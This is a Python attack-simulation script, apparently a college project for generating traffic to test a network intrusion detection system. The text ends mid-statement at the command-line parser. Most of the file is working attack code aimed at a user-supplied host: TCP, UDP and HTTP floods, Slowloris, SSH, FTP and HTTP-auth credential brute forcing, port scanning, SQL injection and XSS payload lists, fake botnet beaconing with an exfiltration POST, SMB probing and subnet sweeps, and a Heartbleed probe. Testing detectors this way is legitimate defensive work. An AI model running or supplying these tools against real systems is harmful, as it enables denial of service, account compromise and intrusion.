"""
╔══════════════════════════════════════════════════════════════════════╗
║      NIDS ATTACK SIMULATION SUITE — Windows Compatible              ║
║      CVR College of Engineering — CSE (CS) — 22CY284               ║
║                                                                     ║
║  No raw sockets. No root/admin needed. Pure Python.                ║
║  Usage: python attack_sim.py --target <IP> --attack <name>         ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import argparse
import socket
import random
import string
import time
import threading
import sys
import os
import base64

# ── colours (Windows CMD + PowerShell safe) ────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# Enable ANSI on Windows
if sys.platform == "win32":
    os.system("color")          # activates ANSI in cmd.exe
    import ctypes
    ctypes.windll.kernel32.SetConsoleMode(
        ctypes.windll.kernel32.GetStdHandle(-11), 7)

def banner(title):
    print(f"\n{BOLD}{CYAN}{'═'*60}{RESET}")
    print(f"{BOLD}{CYAN}  {title}{RESET}")
    print(f"{BOLD}{CYAN}{'═'*60}{RESET}")

def ok(msg):   print(f"{GREEN}  [✓] {msg}{RESET}")
def warn(msg): print(f"{YELLOW}  [!] {msg}{RESET}")
def err(msg):  print(f"{RED}  [✗] {msg}{RESET}")
def info(msg): print(f"  [→] {msg}")

# ══════════════════════════════════════════════════════════════════════════════
# 1. TCP CONNECT FLOOD  →  DoS / DDoS
#    Windows alternative to SYN flood — rapid TCP connect/reset
# ══════════════════════════════════════════════════════════════════════════════
def syn_flood(target, port=80, duration=15, threads=50):
    """
    Windows-safe DoS: opens many TCP connections rapidly and resets them.
    Generates high connection rate → DNN sees high SYN+RST counts,
    high Flow Pkts/s, many short-duration flows.
    """
    banner("TCP CONNECT FLOOD  [DoS / DDoS]")
    info(f"Target : {target}:{port}")
    info(f"Threads: {threads}  |  Duration: {duration}s")
    warn("Windows mode — using TCP connect flood (no raw sockets needed)")

    stop_event  = threading.Event()
    sent_total  = [0]
    lock        = threading.Lock()

    def _worker():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target, port))
                # Send minimal data then reset — creates RST flag in flow
                s.send(b"X" * 64)
                s.close()
                with lock:
                    sent_total[0] += 1
            except Exception:
                with lock:
                    sent_total[0] += 1   # count even failed attempts

    threads_list = [threading.Thread(target=_worker, daemon=True)
                    for _ in range(threads)]
    for t in threads_list:
        t.start()

    start = time.time()
    try:
        while time.time() - start < duration:
            time.sleep(2)
            elapsed = time.time() - start
            rate = sent_total[0] / elapsed if elapsed > 0 else 0
            ok(f"Connections: {sent_total[0]:,}  |  Rate: {rate:.0f}/s")
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        for t in threads_list:
            t.join(timeout=1)

    ok(f"TCP Connect Flood complete. Total connections: {sent_total[0]:,}")


# ══════════════════════════════════════════════════════════════════════════════
# 2. UDP FLOOD  →  DoS / DDoS
# ══════════════════════════════════════════════════════════════════════════════
def udp_flood(target, port=53, duration=15, packet_size=1024):
    """
    Sends large UDP datagrams rapidly to target.
    Works on Windows without admin — UDP sockets are unrestricted.
    Generates: high Flow Byts/s, large Pkt Len Max, zero flag counts.
    """
    banner("UDP FLOOD  [DoS / DDoS]")
    info(f"Target : {target}:{port}")
    info(f"Payload: {packet_size}B  |  Duration: {duration}s")

    payload = bytes(random.getrandbits(8) for _ in range(packet_size))
    sent    = 0
    start   = time.time()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() - start < duration:
            try:
                s.sendto(payload, (target, port))
                sent += 1
                if sent % 500 == 0:
                    elapsed = time.time() - start
                    ok(f"Packets: {sent:,}  |  Rate: {sent/elapsed:.0f}/s")
            except Exception as e:
                warn(f"Send error: {e}")
                time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        s.close()

    ok(f"UDP Flood complete. Packets sent: {sent:,}")


# ══════════════════════════════════════════════════════════════════════════════
# 3. SLOWLORIS  →  DoS (Slow HTTP)
# ══════════════════════════════════════════════════════════════════════════════
def slowloris(target, port=80, duration=30, num_sockets=100):
    """
    Opens many half-complete HTTP connections and keeps them alive.
    Exhausts server threads. Long flow duration + very low packet rate.
    Pure Python — works on Windows without any privileges.
    """
    banner("SLOWLORIS  [DoS – Slow HTTP]")
    info(f"Target  : {target}:{port}")
    info(f"Sockets : {num_sockets}  |  Duration: {duration}s")

    socket_list = []

    def _make_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            # Partial HTTP request — never completed
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0)\r\n")
            return s
        except Exception:
            return None

    info("Opening slow connections...")
    for _ in range(num_sockets):
        s = _make_socket()
        if s:
            socket_list.append(s)

    ok(f"Holding {len(socket_list)} slow connections open")

    start = time.time()
    try:
        while time.time() - start < duration:
            time.sleep(10)
            dead = []
            for s in socket_list:
                try:
                    # Drip-feed headers to keep connections alive
                    s.send(f"X-Heartbeat: {random.randint(1, 9999)}\r\n".encode())
                except Exception:
                    dead.append(s)

            # Replace dead connections
            for s in dead:
                socket_list.remove(s)
                new_s = _make_socket()
                if new_s:
                    socket_list.append(new_s)

            ok(f"Active slow connections: {len(socket_list)}  |  "
               f"Elapsed: {time.time()-start:.0f}s")
    except KeyboardInterrupt:
        pass
    finally:
        for s in socket_list:
            try: s.close()
            except: pass

    ok("Slowloris complete.")


# ══════════════════════════════════════════════════════════════════════════════
# 4. HTTP FLOOD  →  DoS / DDoS
# ══════════════════════════════════════════════════════════════════════════════
def http_flood(target, port=80, duration=15, threads=30):
    """
    Rapid HTTP GET requests from multiple threads.
    High Flow Pkts/s, Fwd Pkts/s, many short TCP flows.
    """
    banner("HTTP FLOOD  [DoS / DDoS – HTTP]")
    info(f"Target : {target}:{port}")
    info(f"Threads: {threads}  |  Duration: {duration}s")

    stop_event  = threading.Event()
    sent_total  = [0]
    lock        = threading.Lock()

    paths = ["/", "/index.html", "/login", "/api/status",
             "/search?q=" + "A"*50, "/upload", "/admin",
             "/config", "/api/users", "/dashboard"]

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko Firefox/54.0",
        "curl/7.88.1",
        "python-requests/2.31.0",
        "Wget/1.21.3",
    ]

    def _worker():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                path = random.choice(paths)
                ua   = random.choice(user_agents)
                req  = (f"GET {path} HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: close\r\n\r\n")
                s.send(req.encode())
                s.recv(256)
                s.close()
                with lock:
                    sent_total[0] += 1
            except Exception:
                pass

    threads_list = [threading.Thread(target=_worker, daemon=True)
                    for _ in range(threads)]
    for t in threads_list:
        t.start()

    start = time.time()
    try:
        while time.time() - start < duration:
            time.sleep(2)
            elapsed = time.time() - start
            ok(f"Requests: {sent_total[0]:,}  |  "
               f"Rate: {sent_total[0]/elapsed:.1f}/s")
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()

    ok(f"HTTP Flood complete. Total requests: {sent_total[0]:,}")


# ══════════════════════════════════════════════════════════════════════════════
# 5. SSH BRUTE FORCE  →  Brute Force
# ══════════════════════════════════════════════════════════════════════════════
def ssh_bruteforce(target, port=22, count=50):
    """
    Simulates SSH brute force.
    Uses paramiko if installed (realistic), else pure TCP socket probe.
    Generates: repeated flows to port 22, high ACK+RST counts.
    Install paramiko: pip install paramiko
    """
    banner("SSH BRUTE FORCE  [Brute Force]")
    info(f"Target : {target}:{port}  |  Attempts: {count}")

    usernames = ["admin","root","administrator","user","ubuntu",
                 "kali","pi","guest","test","oracle","vagrant"]
    passwords = ["password","123456","admin","root","toor",
                 "letmein","qwerty","12345678","pass","welcome",
                 "Password1","abc123","changeme","default"]

    try:
        import paramiko
        has_paramiko = True
        ok("paramiko found — real SSH handshake traffic")
    except ImportError:
        has_paramiko = False
        warn("paramiko not found — using TCP socket simulation")
        warn("For real SSH traffic: pip install paramiko")

    failed = succeeded = 0

    for i in range(count):
        user = usernames[i % len(usernames)]
        pwd  = passwords[i % len(passwords)]

        if has_paramiko:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target, port=port, username=user,
                               password=pwd, timeout=3,
                               banner_timeout=3, auth_timeout=3)
                ok(f"[{i+1}/{count}] {user}:{pwd} → SUCCESS!")
                client.close()
                succeeded += 1
            except paramiko.AuthenticationException:
                info(f"[{i+1}/{count}] {user}:{pwd} → auth failed")
                failed += 1
            except Exception as e:
                warn(f"[{i+1}/{count}] {user} → {type(e).__name__}")
                failed += 1
        else:
            # TCP-level SSH banner grab + fake login attempt
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target, port))
                banner_data = s.recv(256)   # SSH banner
                s.send(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3\r\n")
                time.sleep(0.2)
                s.close()
                info(f"[{i+1}/{count}] {user}:{pwd} → TCP probe sent")
                failed += 1
            except Exception as e:
                warn(f"[{i+1}/{count}] {user} → {type(e).__name__}")
                failed += 1

        time.sleep(0.15)

    ok(f"SSH Brute Force done. Attempts: {count} | "
       f"Success: {succeeded} | Failed: {failed}")


# ══════════════════════════════════════════════════════════════════════════════
# 6. FTP BRUTE FORCE  →  Brute Force
# ══════════════════════════════════════════════════════════════════════════════
def ftp_bruteforce(target, port=21, count=50):
    """
    Real FTP AUTH attempts using Python's built-in ftplib.
    Generates proper FTP control-channel flows.
    """
    banner("FTP BRUTE FORCE  [Brute Force]")
    info(f"Target : {target}:{port}  |  Attempts: {count}")

    import ftplib

    usernames = ["admin","ftp","anonymous","user","root",
                 "ftpuser","administrator","guest","upload"]
    passwords = ["password","123456","ftp","anonymous","",
                 "admin","root","letmein","ftp123"]

    succeeded = failed = 0

    for i in range(count):
        user = usernames[i % len(usernames)]
        pwd  = passwords[i % len(passwords)]
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=3)
            ftp.login(user, pwd)
            ok(f"[{i+1}/{count}] {user}:{pwd} → LOGIN SUCCESS")
            ftp.quit()
            succeeded += 1
        except ftplib.error_perm:
            info(f"[{i+1}/{count}] {user}:{pwd} → auth failed")
            failed += 1
        except Exception as e:
            warn(f"[{i+1}/{count}] {user} → {type(e).__name__}: {e}")
            failed += 1
        time.sleep(0.15)

    ok(f"FTP Brute Force done. "
       f"Success: {succeeded} | Failed: {failed}")


# ══════════════════════════════════════════════════════════════════════════════
# 7. PORT SCAN  →  Probe / Port Scan
# ══════════════════════════════════════════════════════════════════════════════
def portscan(target, start_port=1, end_port=1024, threads=200):
    """
    TCP connect scan — completely standard on Windows, no admin needed.
    Generates: many 1-packet flows, high SYN count, zero bwd packets.
    """
    banner("PORT SCAN  [Probe]")
    info(f"Target : {target}  |  Ports: {start_port}–{end_port}")
    info(f"Threads: {threads}")

    open_ports = []
    all_ports  = list(range(start_port, end_port + 1))
    scanned    = [0]
    lock       = threading.Lock()

    def _scan(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4)
            result = s.connect_ex((target, port))
            s.close()
            with lock:
                scanned[0] += 1
                if result == 0:
                    open_ports.append(port)
                    ok(f"Port {port:5d} OPEN")
        except Exception:
            pass

    # Thread-pool batching
    for i in range(0, len(all_ports), threads):
        batch = all_ports[i:i+threads]
        ts = [threading.Thread(target=_scan, args=(p,), daemon=True)
              for p in batch]
        for t in ts: t.start()
        for t in ts: t.join(timeout=3)
        info(f"Progress: {scanned[0]}/{len(all_ports)} ports scanned...")

    ok(f"Port Scan done. Open ports found: {sorted(open_ports)}")
    return open_ports


# ══════════════════════════════════════════════════════════════════════════════
# 8. WEB ATTACK — SQL INJECTION  →  Web Attack
# ══════════════════════════════════════════════════════════════════════════════
def web_sqli(target, port=80, path="/login", count=30):
    """
    HTTP POST requests with SQL injection payloads.
    Large Fwd Pkt Len, repeated flows to same endpoint.
    """
    banner("SQL INJECTION  [Web Attack]")
    info(f"Target : http://{target}:{port}{path}  |  Payloads: {count}")

    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users;--",
        "1 UNION SELECT null,null,null--",
        "1 UNION SELECT username,password FROM users--",
        "' AND SLEEP(5)--",
        "admin'--",
        "' HAVING 1=1--",
        "1; EXEC xp_cmdshell('whoami')--",
        "') OR ('1'='1",
        "1 AND 1=1",
        "' OR 'unusual'='unusual",
        "1 ORDER BY 1--",
        "1 ORDER BY 99--",
        "' AND 1=(SELECT COUNT(*) FROM tabname);--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1; SELECT * FROM information_schema.tables--",
        "' OR 1=1 LIMIT 1;--",
        "\" OR \"1\"=\"1",
        "1' AND '1'='1",
    ]

    sent = 0
    for i in range(count):
        payload = payloads[i % len(payloads)]
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            body = f"username={payload}&password=test123"
            req  = (f"POST {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{body}")
            s.send(req.encode())
            resp = s.recv(512).decode(errors="ignore")
            s.close()
            code = resp.split()[1] if len(resp.split()) > 1 else "N/A"
            info(f"[{i+1}/{count}] {payload[:35]!r:38} → HTTP {code}")
            sent += 1
        except Exception as e:
            warn(f"[{i+1}/{count}] Connection error: {e}")
        time.sleep(0.2)

    ok(f"SQL Injection done. Requests sent: {sent}")


# ══════════════════════════════════════════════════════════════════════════════
# 9. WEB ATTACK — XSS  →  Web Attack
# ══════════════════════════════════════════════════════════════════════════════
def web_xss(target, port=80, path="/search", count=25):
    """
    HTTP GET requests with XSS payloads in query params.
    """
    banner("XSS ATTACK  [Web Attack]")
    info(f"Target : http://{target}:{port}{path}  |  Payloads: {count}")

    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(document.cookie)",
        "<body onload=alert('XSS')>",
        "'\"><script>alert(1)</script>",
        "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "<ScRiPt>alert(1)</ScRiPt>",
        "\"onmouseover=\"alert(1)",
        "<a href=javascript:alert(1)>click</a>",
        "<div style=background:url(javascript:alert(1))>",
        "';alert(String.fromCharCode(88,83,83))//",
    ]

    sent = 0
    for i in range(count):
        payload = payloads[i % len(payloads)]
        encoded = payload.replace(" ", "+").replace("<", "%3C").replace(">", "%3E")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            req = (f"GET {path}?q={encoded} HTTP/1.1\r\n"
                   f"Host: {target}\r\n"
                   f"User-Agent: Mozilla/5.0\r\n"
                   f"Referer: http://{target}/\r\n"
                   f"Connection: close\r\n\r\n")
            s.send(req.encode())
            resp = s.recv(256).decode(errors="ignore")
            s.close()
            code = resp.split()[1] if len(resp.split()) > 1 else "N/A"
            info(f"[{i+1}/{count}] XSS payload #{i+1} → HTTP {code}")
            sent += 1
        except Exception as e:
            warn(f"[{i+1}/{count}] Error: {e}")
        time.sleep(0.15)

    ok(f"XSS Attack done. Requests: {sent}")


# ══════════════════════════════════════════════════════════════════════════════
# 10. WEB PATATOR — HTTP Auth Brute  →  Web Attack – Patator
# ══════════════════════════════════════════════════════════════════════════════
def web_patator(target, port=80, path="/admin", count=40):
    """
    HTTP Basic Auth brute force — mimics Patator tool traffic.
    Many identical-sized requests to same endpoint with different creds.
    """
    banner("WEB PATATOR — HTTP Auth Brute  [Web Attack]")
    info(f"Target : http://{target}:{port}{path}  |  Attempts: {count}")

    users  = ["admin","administrator","root","manager","user",
              "operator","superuser","sysadmin"]
    passes = ["admin","password","123456","admin123","root",
              "letmein","welcome","qwerty","pass123","secret",
              "Password1","abc123","changeme","default","1234"]

    sent = succeeded = 0
    for i in range(count):
        user  = users[i % len(users)]
        pwd   = passes[i % len(passes)]
        creds = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            req = (f"GET {path} HTTP/1.1\r\n"
                   f"Host: {target}\r\n"
                   f"Authorization: Basic {creds}\r\n"
                   f"User-Agent: Mozilla/5.0\r\n"
                   f"Connection: close\r\n\r\n")
            s.send(req.encode())
            resp = s.recv(256).decode(errors="ignore")
            s.close()
            code   = resp.split()[1] if len(resp.split()) > 1 else "?"
            status = f"{GREEN}SUCCESS{RESET}" if code == "200" else f"HTTP {code}"
            info(f"[{i+1}/{count}] {user}:{pwd:12} → {status}")
            sent += 1
            if code == "200":
                succeeded += 1
        except Exception as e:
            warn(f"[{i+1}/{count}] Error: {e}")
        time.sleep(0.1)

    ok(f"Web Patator done. Attempts: {sent} | Success: {succeeded}")


# ══════════════════════════════════════════════════════════════════════════════
# 11. BOTNET BEACON  →  Botnet / C2
# ══════════════════════════════════════════════════════════════════════════════
def botnet_beacon(target, port=80, beacons=20, interval=5):
    """
    Simulates botnet C2 beaconing traffic:
    - Periodic HTTP POST check-ins at fixed intervals
    - Fixed-size payloads (characteristic of C2 protocols)
    - Occasional fake data exfiltration bursts
    DNN sees: regular Flow IAT Mean, consistent Pkt Len, periodic pattern.
    """
    banner("BOTNET BEACON  [Botnet / C2]")
    info(f"Target  : {target}:{port}")
    info(f"Beacons : {beacons}  |  Interval: {interval}s")

    bot_id = ''.join(random.choices(string.hexdigits, k=16)).lower()
    ok(f"Bot ID : {bot_id}")

    for i in range(beacons):
        # ── Check-in beacon ──────────────────────────────────────────────────
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            body = (f"id={bot_id}&seq={i}&status=alive"
                    f"&os=Windows&tasks=0&interval={interval}")
            req  = (f"POST /beacon HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"X-Bot-ID: {bot_id}\r\n"
                    f"User-Agent: WindowsUpdate/7.0\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{body}")
            s.send(req.encode())
            s.recv(512)
            s.close()
            ok(f"Beacon [{i+1}/{beacons}] → {time.strftime('%H:%M:%S')}")
        except Exception as e:
            warn(f"Beacon [{i+1}] failed: {e}")

        # ── Exfiltration burst every 5th beacon ──────────────────────────────
        if i % 5 == 4:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target, port))
                fake_data = base64.b64encode(
                    (''.join(random.choices(
                        string.ascii_letters + string.digits, k=300))
                    ).encode()).decode()
                body = f"id={bot_id}&type=exfil&payload={fake_data}"
                req  = (f"POST /gate.php HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Connection: close\r\n\r\n"
                        f"{body}")
                s.send(req.encode())
                s.recv(256)
                s.close()
                warn(f"  ↑ Exfil burst sent (beacon {i+1})")
            except Exception:
                pass

        if i < beacons - 1:
            info(f"  Sleeping {interval}s until next beacon...")
            time.sleep(interval)

    ok("Botnet beaconing complete.")


# ══════════════════════════════════════════════════════════════════════════════
# 12. INFILTRATION / LATERAL MOVEMENT  →  Infiltration
# ══════════════════════════════════════════════════════════════════════════════
def infiltration(target):
    """
    Simulates post-compromise lateral movement recon:
    - Probes Windows-specific ports (SMB, RDP, WinRM, LDAP, Kerberos)
    - Sends SMB negotiate packet
    - Sweeps local subnet
    Generates: mixed-protocol flows, many destinations, recon pattern.
    """
    banner("INFILTRATION / LATERAL MOVEMENT  [Infiltration]")
    info(f"Target: {target}")

    probes = [
        (445,  "SMB"),
        (139,  "NetBIOS-SSN"),
        (3389, "RDP"),
        (5985, "WinRM-HTTP"),
        (5986, "WinRM-HTTPS"),
        (389,  "LDAP"),
        (636,  "LDAPS"),
        (88,   "Kerberos"),
        (135,  "MSRPC"),
        (137,  "NetBIOS-NS"),
        (1433, "MSSQL"),
        (3306, "MySQL"),
        (5432, "PostgreSQL"),
        (6379, "Redis"),
        (27017,"MongoDB"),
    ]

    ok("Phase 1 — Service Discovery")
    reachable = []
    for port, svc in probes:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            result = s.connect_ex((target, port))
            s.close()
            if result == 0:
                ok(f"  :{port:5d}  {svc:20} OPEN")
                reachable.append((port, svc))
            else:
                info(f"  :{port:5d}  {svc:20} closed")
        except Exception:
            pass
        time.sleep(0.05)

    ok(f"\nPhase 2 — SMB Negotiate (credential recon simulation)")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target, 445))
        # SMB1 negotiate request
        smb = bytes([
            0x00,0x00,0x00,0x2f,             # NetBIOS length
            0xff,0x53,0x4d,0x42,             # SMB magic
            0x72,                             # negotiate protocol
            0x00,0x00,0x00,0x00,             # status
            0x18,0x43,0xc8,0x00,
            0x00,0x00,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x00,0x00,0x00,
            0xff,0xfe,0x00,0x00,0x00,0x00,
            0x00,0x0c,0x00,0x02,
            0x4e,0x54,0x20,0x4c,0x4d,0x20,
            0x30,0x2e,0x31,0x32,0x00,        # "NT LM 0.12"
        ])
        s.send(smb)
        resp = s.recv(256)
        s.close()
        ok(f"  SMB response: {len(resp)} bytes — OS fingerprint attempted")
    except Exception as e:
        warn(f"  SMB probe: {e}")

    ok("\nPhase 3 — Subnet Sweep (pivoting simulation)")
    base  = ".".join(target.split(".")[:3])
    found = []
    lock  = threading.Lock()

    def _probe_host(ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            if s.connect_ex((ip, 445)) == 0:
                with lock:
                    found.append(ip)
                    ok(f"  {ip} → SMB open (pivot candidate)")
            s.close()
        except Exception:
            pass

    ts = [threading.Thread(target=_probe_host,
                           args=(f"{base}.{i}",), daemon=True)
          for i in range(1, 30)]
    for t in ts: t.start()
    for t in ts: t.join(timeout=5)

    info(f"  Swept {base}.1-29  |  Live hosts found: {len(found)}")
    ok("Infiltration simulation complete.")


# ══════════════════════════════════════════════════════════════════════════════
# 13. HEARTBLEED PROBE  →  Heartbleed
# ══════════════════════════════════════════════════════════════════════════════
def heartbleed(target, port=443):
    """
    Sends a malformed TLS heartbeat request (safe probe).
    Creates characteristic TLS flow with tiny malformed payload.
    Does NOT extract memory — detection probe only.
    """
    banner("HEARTBLEED PROBE  [Heartbleed]")
    info(f"Target : {target}:{port}")
    warn("Safe probe only — does not extract server memory")

    # Malformed TLS 1.1 heartbeat request
    # Payload length field says 16384 but actual data is 1 byte
    heartbeat = bytes([
        0x18,        # TLS record type: heartbeat (24)
        0x03, 0x02,  # TLS version 1.1
        0x00, 0x03,  # record length: 3
        0x01,        # heartbeat type: request
        0x40, 0x00,  # payload_length: 16384 ← the bleed
    ])

    # Minimal TLS ClientHello to initiate handshake
    client_hello = bytes([
        0x16, 0x03, 0x01,       # TLS Handshake, version 1.0
        0x00, 0x2f,             # length: 47
        0x01,                   # HandshakeType: ClientHello
        0x00, 0x00, 0x2b,       # length: 43
        0x03, 0x02,             # ClientHello version: TLS 1.1
    ] + [0x00]*32 +             # random (32 bytes)
    [
        0x00,                   # session ID length: 0
        0x00, 0x02,             # cipher suites length: 2
        0x00, 0x2f,             # TLS_RSA_WITH_AES_128_CBC_SHA
        0x01, 0x00,             # compression: null
        0x00, 0x05,             # extensions length: 5
        0x00, 0x0f,             # extension: heartbeat
        0x00, 0x01,             # extension data length: 1
        0x01,                   # peer_allowed_to_send
    ])

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        ok(f"Connected to {target}:{port}")

        s.send(client_hello)
        time.sleep(0.5)
        try:
            data = s.recv(4096)
            ok(f"ServerHello received ({len(data)} bytes)")
        except Exception:
            pass

        s.send(heartbeat)
        ok("Malformed heartbeat request sent")

        s.settimeout(3)
        try:
            resp = s.recv(4096)
            if len(resp) > 8:
                warn(f"Got {len(resp)} bytes back — server may be VULNERABLE!")
                warn(f"First 32 bytes: {resp[:32].hex()}")
            else:
                ok("No bleed response — server is likely patched")
        except socket.timeout:
            ok("Timeout — server did not respond to heartbeat (likely patched)")

        s.close()

    except ConnectionRefusedError:
        warn(f"Port {port} closed. Is HTTPS/TLS running on target?")
    except Exception as e:
        warn(f"Heartbleed probe error: {type(e).__name__}: {e}")

    ok("Heartbleed probe complete.")


# ══════════════════════════════════════════════════════════════════════════════
# 14. BENIGN TRAFFIC  →  Normal / Benign (baseline)
# ══════════════════════════════════════════════════════════════════════════════
def benign_traffic(target, port=80, requests=20):
    """
    Normal human-paced HTTP browsing — your NIDS should show Benign/Normal.
    Use this BEFORE attacks to establish a clean baseline.
    """
    banner("BENIGN TRAFFIC  [Normal / Baseline]")
    info(f"Target : {target}:{port}  |  Requests: {requests}")

    pages = ["/", "/index.html", "/about", "/contact",
             "/products", "/faq", "/help", "/docs"]
    uas   = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
        "Gecko/20100101 Firefox/121.0",
    ]

    for i in range(requests):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            page = pages[i % len(pages)]
            req  = (f"GET {page} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {random.choice(uas)}\r\n"
                    f"Accept: text/html,application/xhtml+xml\r\n"
                    f"Accept-Language: en-US,en;q=0.9\r\n"
                    f"Connection: close\r\n\r\n")
            s.send(req.encode())
            resp = s.recv(512).decode(errors="ignore")
            s.close()
            code = resp.split()[1] if len(resp.split()) > 1 else "N/A"
            info(f"[{i+1}/{requests}] GET {page:20} → HTTP {code}")
            time.sleep(random.uniform(0.8, 2.0))   # human browsing pace
        except Exception as e:
            warn(f"[{i+1}] {e}")

    ok(f"Benign traffic complete. Requests: {requests}")


# ══════════════════════════════════════════════════════════════════════════════
# FULL SUITE
# ══════════════════════════════════════════════════════════════════════════════
def run_all(target):
    banner("FULL ATTACK SUITE — All CSECICIDS2018 Categories")
    warn("Running all attacks. Watch your NIDS dashboard!")
    warn("Press Ctrl+C during any attack to skip to the next one.")
    input(f"\n  {BOLD}Press ENTER to begin...{RESET}\n")

    tests = [
        ("Benign Baseline",         lambda: benign_traffic(target, requests=15)),
        ("TCP Connect Flood (DoS)", lambda: syn_flood(target, duration=12)),
        ("UDP Flood",               lambda: udp_flood(target, duration=12)),
        ("HTTP Flood",              lambda: http_flood(target, duration=12)),
        ("Slowloris",               lambda: slowloris(target, duration=20,
                                                      num_sockets=80)),
        ("SSH Brute Force",         lambda: ssh_bruteforce(target, count=30)),
        ("FTP Brute Force",         lambda: ftp_bruteforce(target, count=30)),
        ("Port Scan",               lambda: portscan(target, end_port=500)),
        ("SQL Injection",           lambda: web_sqli(target, count=25)),
        ("XSS Attack",              lambda: web_xss(target, count=20)),
        ("Web Patator",             lambda: web_patator(target, count=30)),
        ("Botnet Beacon",           lambda: botnet_beacon(target, beacons=10,
                                                          interval=4)),
        ("Infiltration",            lambda: infiltration(target)),
        ("Heartbleed Probe",        lambda: heartbleed(target)),
    ]

    results = []
    for name, fn in tests:
        print(f"\n{BOLD}{YELLOW}>>> [{tests.index((name,fn))+1}/{len(tests)}] "
              f"Starting: {name}{RESET}")
        try:
            fn()
            results.append((name, "✓ Done", GREEN))
        except KeyboardInterrupt:
            warn(f"Skipped: {name}")
            results.append((name, "⚠ Skipped", YELLOW))
        except Exception as e:
            err(f"Failed: {name} → {e}")
            results.append((name, f"✗ Error", RED))

        pause = 15
        info(f"Waiting {pause}s for NIDS to expire + classify flows...")
        time.sleep(pause)

    # Summary
    print(f"\n{BOLD}{CYAN}{'═'*55}")
    print(f"  RESULTS SUMMARY")
    print(f"{'═'*55}{RESET}")
    for name, status, col in results:
        print(f"  {col}{status:12}{RESET}  {name}")
    print()


# ══════════════════════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════
ATTACKS = {
    "syn_flood":      syn_flood,
    "udp_flood":      udp_flood,
    "slowloris":      slowloris,
    "http_flood":     http_flood,
    "ssh_bruteforce": ssh_bruteforce,
    "ftp_bruteforce": ftp_bruteforce,
    "portscan":       portscan,
    "web_sqli":       web_sqli,
    "web_xss":        web_xss,
    "web_patator":    web_patator,
    "botnet_beacon":  botnet_beacon,
    "infiltration":   infiltration,
    "heartbleed":     heartbleed,
    "benign":         benign_traffic,
    "all":            run_all,
}

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
